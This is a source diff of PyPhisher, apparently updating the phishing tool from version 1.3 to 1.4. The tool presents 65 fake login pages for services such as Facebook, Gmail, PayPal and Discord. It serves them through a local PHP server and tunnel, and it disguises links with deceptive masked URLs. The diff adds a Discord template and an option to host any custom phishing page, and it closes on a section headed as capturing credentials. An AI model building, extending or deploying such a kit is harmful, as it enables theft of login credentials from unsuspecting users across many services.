@@ -1,6 +1,6 @@
 # -*- coding: UTF-8 -*-
 # Tool    : PyPhisher
-# Version : 1.3
+# Version : 1.4
 # Author  : KasRoudra
 # Github  : https://github.com/KasRoudra
 # Contact : https://m.me/KasRoudra
@@ -100,7 +100,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="1.3"
+version="1.4"
 
 ask = green + '[' + white + '?' + green + '] '+ yellow
 success = yellow + '[' + white + '√' + yellow + '] '+green
@@ -162,36 +162,37 @@ logo='''
 '''+blue+''' |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
 '''+red+''' | |   | |_| | |    | | | | \__ \ | | |  __/ |   
 '''+yellow+''' |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
-'''+green+'''         __/ |                          '''+cyan+'''[v1.3]
+'''+green+'''         __/ |                          '''+cyan+'''[v1.4]
 '''+cyan+'''        |___/                   '''+red+'''[By KasRoudra]
 '''
 
 # Website chooser
 def options():
     print()
-    print(green+'['+white+'01'+green+']'+yellow+' Facebook Traditional    '+green+'['+white+'22'+green+']'+yellow+' LinkedIn       '+green+'['+white+'43'+green+']'+yellow+' Origin')
-    print(green+'['+white+'02'+green+']'+yellow+' Facebook Voting         '+green+'['+white+'23'+green+']'+yellow+' Ebay           '+green+'['+white+'44'+green+']'+yellow+' DropBox')
-    print(green+'['+white+'03'+green+']'+yellow+' Facebook Security       '+green+'['+white+'24'+green+']'+yellow+' Quora          '+green+'['+white+'45'+green+']'+yellow+' Yahoo')
-    print(green+'['+white+'04'+green+']'+yellow+' Messenger               '+green+'['+white+'25'+green+']'+yellow+' Protonmail     '+green+'['+white+'46'+green+']'+yellow+' WordPress')
-    print(green+'['+white+'05'+green+']'+yellow+' Instagram Traditional   '+green+'['+white+'26'+green+']'+yellow+' Spotify        '+green+'['+white+'47'+green+']'+yellow+' Yandex')
-    print(green+'['+white+'06'+green+']'+yellow+' Insta Auto Followers    '+green+'['+white+'27'+green+']'+yellow+' Reddit         '+green+'['+white+'48'+green+']'+yellow+' StackOverflow')
-    print(green+'['+white+'07'+green+']'+yellow+' Insta 1000 Followers    '+green+'['+white+'28'+green+']'+yellow+' Adobe          '+green+'['+white+'49'+green+']'+yellow+' VK')
-    print(green+'['+white+'08'+green+']'+yellow+' Insta Blue Verify       '+green+'['+white+'29'+green+']'+yellow+' DevianArt      '+green+'['+white+'50'+green+']'+yellow+' VK Poll')
-    print(green+'['+white+'09'+green+']'+yellow+' Gmail Old               '+green+'['+white+'30'+green+']'+yellow+' Badooo         '+green+'['+white+'51'+green+']'+yellow+' Xbox')
-    print(green+'['+white+'10'+green+']'+yellow+' Gmail New               '+green+'['+white+'31'+green+']'+yellow+' Clash Of Clans '+green+'['+white+'52'+green+']'+yellow+' Mediafire')
-    print(green+'['+white+'11'+green+']'+yellow+' Gmail Poll              '+green+'['+white+'32'+green+']'+yellow+' Ajio           '+green+'['+white+'53'+green+']'+yellow+' Gitlab')
-    print(green+'['+white+'12'+green+']'+yellow+' Microsoft               '+green+'['+white+'33'+green+']'+yellow+' JioRouter      '+green+'['+white+'54'+green+']'+yellow+' Github')
-    print(green+'['+white+'13'+green+']'+yellow+' Netflix                 '+green+'['+white+'34'+green+']'+yellow+' FreeFire       '+green+'['+white+'55'+green+']'+yellow+' Apple')
-    print(green+'['+white+'14'+green+']'+yellow+' Paypal                  '+green+'['+white+'35'+green+']'+yellow+' Pubg           '+green+'['+white+'56'+green+']'+yellow+' iCloud')
-    print(green+'['+white+'15'+green+']'+yellow+' Steam                   '+green+'['+white+'36'+green+']'+yellow+' Telegram       '+green+'['+white+'57'+green+']'+yellow+' Shopify')
-    print(green+'['+white+'16'+green+']'+yellow+' Twitter                 '+green+'['+white+'37'+green+']'+yellow+' Youtube        '+green+'['+white+'58'+green+']'+yellow+' Myspace')
-    print(green+'['+white+'17'+green+']'+yellow+' PlayStation             '+green+'['+white+'38'+green+']'+yellow+' Airtel         '+green+'['+white+'59'+green+']'+yellow+' Shopping')
-    print(green+'['+white+'18'+green+']'+yellow+' TikTok                  '+green+'['+white+'39'+green+']'+yellow+' SocialClub     '+green+'['+white+'60'+green+']'+yellow+' Cryptocurrency')
-    print(green+'['+white+'19'+green+']'+yellow+' Twitch                  '+green+'['+white+'40'+green+']'+yellow+' Ola            '+green+'['+white+'61'+green+']'+yellow+' SnapChat2')
-    print(green+'['+white+'20'+green+']'+yellow+' Pinterest               '+green+'['+white+'41'+green+']'+yellow+' Outlook        '+green+'['+white+'62'+green+']'+yellow+' Verizon')
-    print(green+'['+white+'21'+green+']'+yellow+' SnapChat                '+green+'['+white+'42'+green+']'+yellow+' Amazon         '+green+'['+white+'63'+green+']'+yellow+' Wi-Fi')
+    print(green+'['+white+'01'+green+']'+yellow+' Facebook Traditional    '+green+'['+white+'23'+green+']'+yellow+' Ebay            '+green+'['+white+'44'+green+']'+yellow+' DropBox')
+    print(green+'['+white+'02'+green+']'+yellow+' Facebook Voting         '+green+'['+white+'24'+green+']'+yellow+' Quora           '+green+'['+white+'45'+green+']'+yellow+' Yahoo')
+    print(green+'['+white+'03'+green+']'+yellow+' Facebook Security       '+green+'['+white+'25'+green+']'+yellow+' Protonmail      '+green+'['+white+'46'+green+']'+yellow+' WordPress')
+    print(green+'['+white+'04'+green+']'+yellow+' Messenger               '+green+'['+white+'26'+green+']'+yellow+' Spotify         '+green+'['+white+'47'+green+']'+yellow+' Yandex')
+    print(green+'['+white+'05'+green+']'+yellow+' Instagram Traditional   '+green+'['+white+'27'+green+']'+yellow+' Reddit          '+green+'['+white+'48'+green+']'+yellow+' StackOverflow')
+    print(green+'['+white+'06'+green+']'+yellow+' Insta Auto Followers    '+green+'['+white+'28'+green+']'+yellow+' Adobe           '+green+'['+white+'49'+green+']'+yellow+' VK')
+    print(green+'['+white+'07'+green+']'+yellow+' Insta 1000 Followers    '+green+'['+white+'29'+green+']'+yellow+' DevianArt       '+green+'['+white+'50'+green+']'+yellow+' VK Poll')
+    print(green+'['+white+'08'+green+']'+yellow+' Insta Blue Verify       '+green+'['+white+'30'+green+']'+yellow+' Badoo           '+green+'['+white+'51'+green+']'+yellow+' Xbox')
+    print(green+'['+white+'09'+green+']'+yellow+' Gmail Old               '+green+'['+white+'31'+green+']'+yellow+' Clash Of Clans  '+green+'['+white+'52'+green+']'+yellow+' Mediafire')
+    print(green+'['+white+'10'+green+']'+yellow+' Gmail New               '+green+'['+white+'32'+green+']'+yellow+' Ajio            '+green+'['+white+'53'+green+']'+yellow+' Gitlab')
+    print(green+'['+white+'11'+green+']'+yellow+' Gmail Poll              '+green+'['+white+'33'+green+']'+yellow+' JioRouter       '+green+'['+white+'54'+green+']'+yellow+' Github')
+    print(green+'['+white+'12'+green+']'+yellow+' Microsoft               '+green+'['+white+'34'+green+']'+yellow+' FreeFire        '+green+'['+white+'55'+green+']'+yellow+' Apple')
+    print(green+'['+white+'13'+green+']'+yellow+' Netflix                 '+green+'['+white+'35'+green+']'+yellow+' Pubg            '+green+'['+white+'56'+green+']'+yellow+' iCloud')
+    print(green+'['+white+'14'+green+']'+yellow+' Paypal                  '+green+'['+white+'36'+green+']'+yellow+' Telegram        '+green+'['+white+'57'+green+']'+yellow+' Shopify')
+    print(green+'['+white+'15'+green+']'+yellow+' Steam                   '+green+'['+white+'37'+green+']'+yellow+' Youtube         '+green+'['+white+'58'+green+']'+yellow+' Myspace')
+    print(green+'['+white+'16'+green+']'+yellow+' Twitter                 '+green+'['+white+'38'+green+']'+yellow+' Airtel          '+green+'['+white+'59'+green+']'+yellow+' Shopping')
+    print(green+'['+white+'17'+green+']'+yellow+' PlayStation             '+green+'['+white+'39'+green+']'+yellow+' SocialClub      '+green+'['+white+'60'+green+']'+yellow+' Cryptocurrency')
+    print(green+'['+white+'18'+green+']'+yellow+' TikTok                  '+green+'['+white+'40'+green+']'+yellow+' Ola             '+green+'['+white+'61'+green+']'+yellow+' SnapChat2')
+    print(green+'['+white+'19'+green+']'+yellow+' Twitch                  '+green+'['+white+'41'+green+']'+yellow+' Outlook         '+green+'['+white+'62'+green+']'+yellow+' Verizon')
+    print(green+'['+white+'20'+green+']'+yellow+' Pinterest               '+green+'['+white+'42'+green+']'+yellow+' Amazon          '+green+'['+white+'63'+green+']'+yellow+' Wi-Fi')
+    print(green+'['+white+'21'+green+']'+yellow+' SnapChat                '+green+'['+white+'43'+green+']'+yellow+' Origin          '+green+'['+white+'64'+green+']'+yellow+' Discord')
+    print(green+'['+white+'22'+green+']'+yellow+' LinkedIn                '+green+''+white+''+green+''+yellow+'                     '+green+'['+white+'65'+green+']'+yellow+' Custom')
     print()
-    print(green+'['+white+'x'+green+']'+yellow+' About                    '+green+'['+white+'m'+green+']'+yellow+' More tools      '+green+'['+white+'0'+green+']'+yellow+' Exit')
+    print(green+'['+white+'x'+green+']'+yellow+' About                    '+green+'['+white+'m'+green+']'+yellow+' More tools       '+green+'['+white+'0'+green+']'+yellow+' Exit')
     print()
     print()
 
@@ -223,7 +224,7 @@ def update():
         if upask=="y":
             print(nc)
             system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
-            sprint("\n"+success+"PyPhisher updated successfully!!\n")
+            sprint("\n"+success+"PyPhisher updated successfully!! Please restart terminal!\n")
             if (changelog != "404: Not Found"):
                 print(info2+"Changelog:\n"+purple+changelog)
             exit()
@@ -285,7 +286,7 @@ def about():
     system("clear")
     slowprint(logo)
     print(red+'[ToolName]  '+cyan+' :[PyPhisher] ')
-    print(red+'[Version]   '+cyan+' :[1.3]')
+    print(red+'[Version]   '+cyan+' :[1.4]')
     print(red+'[Author]    '+cyan+' :[KasRoudra] ')
     print(red+'[Github]    '+cyan+' :[https://github.com/KasRoudra] ')
     print(red+'[Messenger] '+cyan+' :[https://m.me/KasRoudra]')
@@ -413,6 +414,13 @@ def main():
     if system("pidof ngrok > /dev/null 2>&1")==0:
         sprint(error+"Previous ngrok still running. Please restart terminal and try again"+nc)
         exit()
+    while True:
+        if os.path.exists(root+"/.site"):
+            system("rm -rf $HOME/.site && cd $HOME && mkdir .site")
+            break
+        else:
+            system("cd $HOME && mkdir .site")
+            break
     while True:
         os.system("clear")
         slowprint(logo)
@@ -576,7 +584,7 @@ def main():
             requirements(folder,mask)
         elif choose == "40":
             folder="ola"
-            mask='https://get-1k-followers-on-gitlab-free'
+            mask='https://book-a-cab-in-discount'
             requirements(folder,mask)
         elif choose == "41":
             folder="outlook"
@@ -670,6 +678,12 @@ def main():
             folder="wifi"
             mask='https://reconnect-your-wifi'
             requirements(folder,mask)
+        elif choose == "64":
+            folder="discord"
+            mask='https://security-bot-for-your-discord-free'
+            requirements(folder,mask)
+        elif choose == "65":
+            customfol()
         elif choose == "x" or choose == "X":
             about()
         elif choose == "m" or choose == "M":
@@ -681,15 +695,22 @@ def main():
             sprint("\n"+error+"Wrong input")
             main()
 
+# Copy website files from custom location
+def customfol():
+    fol=input("\n"+ask+"Enter the directory > "+green)
+    if os.path.exists(fol):
+        if os.path.isfile(fol+"/index.php"):
+            system("cd "+fol+" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site")
+            server()
+        else:
+            sprint(error+"Index.php required but not found!")
+            main()
+    else:
+        sprint(error+"Directory do not exists!")
+        main()
+
 # 2nd function checking requirements and download files 
 def requirements(folder,mask):
-    while True:
-        if os.path.exists(root+"/.site"):
-            system("rm -rf $HOME/.site && cd $HOME && mkdir .site")
-            break
-        else:
-            system("cd $HOME && mkdir .site")
-            break
     if os.path.isfile("websites.zip"):
         system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
         system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
@@ -713,10 +734,15 @@ def requirements(folder,mask):
     with open(".info.txt", "w") as inform:
         inform.write(mask)
     system("mv -f .info.txt $HOME/.site")
+    server()
+
+# Start server and tunneling
+def server():
     system("clear")
     slowprint(logo)
     if termux:
         sprint("\n"+info+"If you haven't enabled hotspot, please enable it!")
+        sleep(1)
     sprint("\n"+info2+"Initializing PHP server at localhost:8080....")
     internet()
     system("cd $HOME/.site && php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
@@ -831,13 +857,13 @@ def masking(url):
 # Output urls
 def url_manager(url,num1,num2):
     internet()
-    with open(root+"/.site/.info.txt", "r") as inform:
-        masked=inform.read()
-
     sprint("\n"+success+"Your urls are given below: \n")
     system("rm -rf $HOME/.site/ip.txt")
     print(info2+"URL "+num1+" > "+yellow+url)
-    print(info2+"URL "+num2+" > "+yellow+masked.strip()+"@"+url.replace("https://",""))
+    if os.path.isfile(root+"/.site/.info.txt"):
+        with open(root+"/.site/.info.txt", "r") as inform:
+            masked=inform.read()
+            print(info2+"URL "+num2+" > "+yellow+masked.strip()+"@"+url.replace("https://",""))
 
 
 # Last function capturing credentials
